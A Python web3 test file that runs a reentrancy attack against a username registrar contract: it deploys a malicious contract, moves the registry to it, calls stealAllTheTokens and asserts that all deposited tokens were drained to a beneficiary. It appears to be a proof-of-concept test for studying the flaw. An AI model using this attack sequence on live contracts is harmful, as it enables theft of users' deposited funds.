from web3 import Web3


def test_attack_controller_steal_all_deposits(
        accounts,
        registrar_deploy,
        register_accounts,
        reentrancy_attack_deploy
        ):

    (c, r, token_c, ens_c, resolver_c, ens_node) = registrar_deploy()

    price = 300
    registered_accounts = 10

    register_accounts(
            c,
            token_c,
            no_accounts=registered_accounts,
            price=price
            )

    # ensure the contract has tokens
    assert token_c.functions.balanceOf(c.address).call() == \
        price*registered_accounts, "There should be " + \
        str(price*registered_accounts) + " tokens in the contract"

    # steal all the tokens
    # deploy malicious contract
    (attack_c, _, beneficiary) = reentrancy_attack_deploy(c, token_c)
    token_c.functions.transfer(
            attack_c.address,
            c.functions.price().call()).transact({
                    'from': accounts[0]})

    attack_name = Web3.soliditySha3(["string"], ["alltokensarebelongtous"])
    attack_c.functions.registerName(attack_name).transact({'from': accounts[0]})

    c.functions.moveRegistry(attack_c.address).transact({'from': accounts[0]})

    # Call the reentrancy
    attack_c.functions.stealAllTheTokens().transact(
            {"from": accounts[0], "gas": 6000000})

    # We have stolen all the funds
    assert token_c.functions.balanceOf(beneficiary).call() == \
                price*(registered_accounts + 1), "all funds were not stolen"
    assert token_c.functions.balanceOf(c.address).call() == 0, \
    "username registrar contract has been depleted of all tokens"
